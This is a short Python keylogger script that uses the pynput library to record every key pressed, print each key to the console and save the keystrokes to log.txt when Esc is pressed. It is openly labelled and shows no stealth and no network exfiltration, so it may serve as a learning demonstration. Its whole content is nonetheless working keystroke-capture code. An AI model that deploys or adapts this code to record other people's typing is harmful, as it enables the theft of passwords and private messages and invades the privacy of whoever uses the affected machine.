import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    if key != Key.esc:
        keys.append(key)
        print('Key pressed: {0}'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.backspace:
                f.write('<BACKSPACE>')
            else:
                f.write(str(key))

def on_release(key):
    if key == Key.esc:
        write_file(keys)
        print('Logging stopped.')
        return False
    print('Key released: {0}'.format(key))

with Listener(on_press=on_press, on_release=on_release) as listener:
    print('Keylogger started. Press Esc to stop logging.')
    listener.join()
